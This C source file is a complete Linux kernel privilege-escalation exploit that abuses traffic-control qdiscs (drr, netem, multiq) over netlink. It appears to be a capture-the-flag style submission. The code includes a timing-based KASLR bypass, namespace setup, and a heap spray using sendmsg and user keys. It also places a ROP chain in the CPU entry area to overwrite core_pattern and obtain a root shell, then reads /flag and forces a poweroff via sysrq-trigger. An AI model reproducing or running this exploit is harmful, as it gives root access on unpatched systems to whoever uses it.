#define _GNU_SOURCE

#include <arpa/inet.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <keyutils.h>

#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>

#include <net/if.h>

int sockfd = -1;

uint64_t kbase = 0xffffffff81000000;

#define MMAP_ADDR 0xa00000
#define MMAP_SIZE 0x2000

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile ("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

void prefetch(void* p)
{
    asm volatile (
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

int bypass_kaslr(uint64_t base) {
    if (!base) {
    #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            uint64_t bases[15] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    uint64_t addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (c == 0) {
                base = bases[i];
            } else if (base == bases[i]) {
                c++;
            } else {
                c--;
            }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (base == bases[i]) {
                c++;
            }
            }
            if (c > ARRAY_LEN(bases) / 2) {
            base -= OFFSET;
            goto got_base;
            }
        }
    #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 9
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            uint64_t bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    uint64_t addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (c == 0) {
                base = bases[i];
            } else if (base == bases[i]) {
                c++;
            } else {
                c--;
            }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
            if (base == bases[i]) {
                c++;
            }
            }
            if (c > ARRAY_LEN(bases) / 2) {
            goto got_base;
            }
        }
    #endif
    }

got_base:
    kbase = base;

    return 0;
}

void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR | O_CREAT, 0600);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

void set_affinity(int cpuid){
    cpu_set_t my_set;
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

    if (cpu_cores == 1) return;

    CPU_ZERO(&my_set);

    CPU_SET(cpuid, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

#define NETLINK_BUFSIZE 4096

int ip_link_lo_up() {
    struct {
        struct nlmsghdr nlh;
        struct ifinfomsg ifinfo;
        char buffer[NETLINK_BUFSIZE];
    } req;

    struct sockaddr_nl sa;
    struct iovec iov;
    struct msghdr msg;
    int sock;
    int lo_ifindex;

    sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    lo_ifindex = if_nametoindex("lo");
    if (lo_ifindex == 0) {
        perror("if_nametoindex");
        close(sock);
        return -1;
    }

    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_NEWLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    req.ifinfo.ifi_family = AF_UNSPEC;
    req.ifinfo.ifi_index = lo_ifindex;
    req.ifinfo.ifi_change = 0xFFFFFFFF;
    req.ifinfo.ifi_flags = IFF_UP | IFF_RUNNING;

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;

    iov.iov_base = &req;
    iov.iov_len = req.nlh.nlmsg_len;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &sa;
    msg.msg_namelen = sizeof(sa);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    if (sendmsg(sock, &msg, 0) < 0) {
        perror("sendmsg");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while(0)

#define NLMSG_TAIL(nmsg)                                                       \
((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
            int alen) {
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
    memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
    return n->nlmsg_len;
}

int add_veth_link(const char *name, const char *peer_name, int num_rx_queues, int num_tx_queues) {
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) {
        perror("socket");
        return -1;
    }

    char *start = malloc(NETLINK_BUFSIZE);
    memset(start, 0, NETLINK_BUFSIZE);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // Netlink message header
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    msg->nlmsg_type = RTM_NEWLINK;
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    struct ifinfomsg *ifi = (struct ifinfomsg *)(start + sizeof(struct nlmsghdr));
    ifi->ifi_family = AF_UNSPEC;

    // Interface name attribute
    addattr_l(msg, NETLINK_BUFSIZE, IFLA_IFNAME, name, strlen(name) + 1);

    // Device type (veth)
    struct rtattr *linkinfo = addattr_nest(msg, NETLINK_BUFSIZE, IFLA_LINKINFO);
    addattr_l(msg, NETLINK_BUFSIZE, IFLA_INFO_KIND, "veth", strlen("veth") + 1);

    // Link info data for peer
    struct rtattr *linkdata = addattr_nest(msg, NETLINK_BUFSIZE, IFLA_INFO_DATA);
    struct rtattr *peer = addattr_nest(msg, NETLINK_BUFSIZE, VETH_INFO_PEER);

    // Peer attributes
    struct ifinfomsg peer_ifi = { .ifi_family = AF_UNSPEC };
    addattr_l(msg, NETLINK_BUFSIZE, IFLA_IFNAME, peer_name, strlen(peer_name) + 1);
    memcpy(((char *)msg) + NLMSG_ALIGN(msg->nlmsg_len), &peer_ifi, sizeof(peer_ifi));
    msg->nlmsg_len += NLMSG_ALIGN(sizeof(peer_ifi));

    addattr_nest_end(msg, peer);
    addattr_nest_end(msg, linkdata);
    addattr_nest_end(msg, linkinfo);

    // RX and TX queues
    addattr_l(msg, NETLINK_BUFSIZE, IFLA_NUM_RX_QUEUES, &num_rx_queues, sizeof(num_rx_queues));
    addattr_l(msg, NETLINK_BUFSIZE, IFLA_NUM_TX_QUEUES, &num_tx_queues, sizeof(num_tx_queues));

    // Send Netlink message
    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = msg, .iov_len = msg->nlmsg_len };
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    if (sendmsg(fd, &msgh, 0) < 0) {
        perror("sendmsg");
        free(start);
        return -1;
    }

    free(start);
    close(fd);

    return 0;
}

int add_qdisc_drr(int fd, uint32_t parent, uint32_t handle) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "drr", 4);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int add_qdisc_netem(int fd, uint32_t parent, uint32_t handle, int64_t latency) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "netem", 6);

    struct tc_netem_qopt opt = {0,};

    opt.latency = latency;
    opt.limit   = 1000;

    addattr_l(msg, 0x1000, TCA_OPTIONS, &opt, sizeof(struct tc_netem_qopt));

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int add_qdisc_multiq(int fd) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 9;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    uint32_t handle = 0x1000;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    char data[0x10] = {0,};

    addattr_l(msg, 0x1000, TCA_OPTIONS, data, 8);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    return sendmsg(fd, &msgh, 0);
}

int del_qdisc_multiq(int fd) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST;
    msg->nlmsg_type = RTM_DELQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 9;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    uint32_t prio = 1;
    uint32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    uint32_t handle = 0x1000;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    char data[8] = {0,};

    addattr_l(msg, 0x1000, TCA_OPTIONS, data, 8);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    return sendmsg(fd, &msgh, 0);
}

int add_class_drr(int fd, uint32_t parent, uint32_t handle) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWTCLASS;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = parent;
    t->tcm_handle = handle;

    // prio, protocol
    uint32_t prio = 1;
    uint32_t protocol = 1;

    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "drr", 4);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);

    return 1;
}

int del_class_drr(int fd, uint32_t handle) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // del class
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST;
    msg->nlmsg_type = RTM_DELTCLASS;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    t->tcm_handle = handle;

    // prio, protocol
    uint32_t prio = 1;
    uint32_t protocol = 1;

    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);

    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);
    return 1;
}

#define QDISC_RESET                         0xe83860
#define CORE_PATTERN                        0x2bbace0
#define COPY_FROM_USER                      0x87db00
#define MSLEEP                              0x232f10

#define PUSH_RBX_POP_RSP_RBP_RET            0x10234d1   // push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; jmp 0xffffffff82605280
#define POP_RDI_POP_RSI_POP_RDX_POP_RET     0x0d5e29    // pop rdi ; pop rsi ; pop rdx ; pop rcx ; jmp 0xffffffff82605280
#define POP_POP_RET                         0x0d5e2b    // pop rdx ; pop rcx ; jmp 0xffffffff82605280

// CPU entry area pointers. We prepare some memory here that will be referenced
// by the ROP chains.
// We need:
//  - the struct nft_expr_ops { .eval } member
#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58)

#define PEEK_OFF 0x38

struct cpu_entry_area_payload {
    uint64_t regs[16];
};

static void sig_handler(int s) {}

static __attribute__((noreturn)) void write_cpu_entry_area(void* payload) {
    asm volatile (
        "mov %0, %%rsp\n"
        "pop %%r15\n"
        "pop %%r14\n"
        "pop %%r13\n"
        "pop %%r12\n"
        "pop %%rbp\n"
        "pop %%rbx\n"
        "pop %%r11\n"
        "pop %%r10\n"
        "pop %%r9\n"
        "pop %%r8\n"
        "pop %%rax\n"
        "pop %%rcx\n"
        "pop %%rdx\n"
        "pop %%rsi\n"
        "pop %%rdi\n"
        "divq (0x1234000)\n"
        : : "r"(payload)
    );
    __builtin_unreachable();
}

// Fill the CPU entry area exception stack of HELPER_CPU with a
// struct cpu_entry_area_payload
static void setup_cpu_entry_area() {
    if (fork()) {
        return;
    }

    struct cpu_entry_area_payload payload = {};

    payload.regs[0] = kbase+QDISC_RESET;                        // multiq->ops->peek
    payload.regs[1] = kbase+POP_POP_RET;
    payload.regs[2] = kbase + PUSH_RBX_POP_RSP_RBP_RET;         // multiq->ops->reset
    payload.regs[3] = PAYLOAD_LOCATION(1) - PEEK_OFF ;          // fake ops
    payload.regs[4] = kbase + POP_RDI_POP_RSI_POP_RDX_POP_RET;
    payload.regs[5] = kbase + CORE_PATTERN;
    payload.regs[6] = MMAP_ADDR;
    payload.regs[7] = strlen((char*)MMAP_ADDR);
    payload.regs[8] = 0;
    payload.regs[9] = kbase + COPY_FROM_USER;
    payload.regs[10] = kbase + MSLEEP;

    set_affinity(1);
    signal(SIGFPE, sig_handler);
    signal(SIGTRAP, sig_handler);
    signal(SIGSEGV, sig_handler);
    setsid();

    while(1){
        write_cpu_entry_area(&payload);
        usleep(10000);
    }
}

void spray_sendmsg(char *buff, size_t size) {
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    msg.msg_control = buff;
    msg.msg_controllen = size;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    sendmsg(sockfd, &msg, 0);
}

#define USER_KEY_PAYLOAD_HEADER_LEN 0x18
int keys[0x1000];

/*
*	Allocate a user_key_payload structure.
*/
int key_alloc(int i, char *buff, size_t size)
{
    char desc[256] = { 0 };
    key_serial_t key;
    char *payload;

    sprintf(desc, "payload_%d", i);

    size -= USER_KEY_PAYLOAD_HEADER_LEN;
    payload = buff ? buff : calloc(1, size);

    if (!buff)
        *(uint64_t *)&payload[0] = i; // Tag the key

    keys[i] = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (keys[i] < 0) {
        perror("[x] key_alloc()");
        return -1;
    }

    return 0;
}

void loopback_send (uint64_t p) {
    struct sockaddr iaddr = { AF_INET };
    int priority = p;
    char data[0x10000] = {0,};

    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);

    if (inet_sock_fd == -1)
        err_exit("[-] inet socket");

    setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));

    if (connect(inet_sock_fd, &iaddr, sizeof(iaddr)) == -1)
        err_exit("[-] connect");

    if (write(inet_sock_fd, data, 1) == -1)
        err_exit("[-] inet write");

    close(inet_sock_fd);
}

int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);
    while (check_core() == 0)
        sleep(1);
    puts("Root shell !!");
    /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
    *(size_t *)0 = 0;
}

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#define NETEM_10MS 156250
#define SPRAY_SIZE 0x2008

void exploit(){
    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);

    const unsigned int drr_qdisc = 0xffff0000;
    const unsigned int drr_class = 0xffff0001;
    const unsigned int drr_class_vuln = 0xffffffff;

    const unsigned int netem_qdisc = 0x20000;

    add_qdisc_drr(sockfd, TC_H_ROOT, drr_qdisc);

    add_class_drr(sockfd, drr_qdisc, drr_class_vuln);
    add_class_drr(sockfd, drr_qdisc, drr_class);

    add_qdisc_netem(sockfd, drr_class, netem_qdisc, NETEM_10MS);

    loopback_send(drr_class);
    loopback_send(drr_class_vuln);

    del_class_drr(sockfd, drr_class_vuln);

    // wait for destroy
    usleep(30*1000);

    add_qdisc_multiq(sockfd);
    del_qdisc_multiq(sockfd);

    // wait for destroy
    usleep(30*1000);

    uint64_t fake_qdiscs[SPRAY_SIZE/8] = {0,};

    fake_qdiscs[1] = PAYLOAD_LOCATION(1);

    for(int i = 0 ; i < 2; i++){
        spray_sendmsg((char*) fake_qdiscs, SPRAY_SIZE);
        key_alloc(i, (char*)(fake_qdiscs+USER_KEY_PAYLOAD_HEADER_LEN), SPRAY_SIZE);
    }

    loopback_send(drr_class);
}

int main(int argc, char **argv) {
    if (argc > 1)
    {
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        /* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
        system("cat /flag;echo o>/proc/sysrq-trigger");
    }

    if (fork() == 0) // this process is used to trigger core_pattern exploit
    {
        set_affinity(1);
        setsid();
        crash("");
    }

    new_ns();

    char *core = (void *)mmap((void *)MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
    strcpy(core, "|/proc/%P/fd/666 %P"); // put payload string into known address which will used by ebpf shellcode

    bypass_kaslr(0);

    setup_cpu_entry_area();

    set_affinity(0);

    ip_link_lo_up();

    // ip link add outer0 numrxqueues 16 numtxqueues 1025 type veth peer
    add_veth_link("outer0", "inner0", 16, 1025);

    exploit();
}
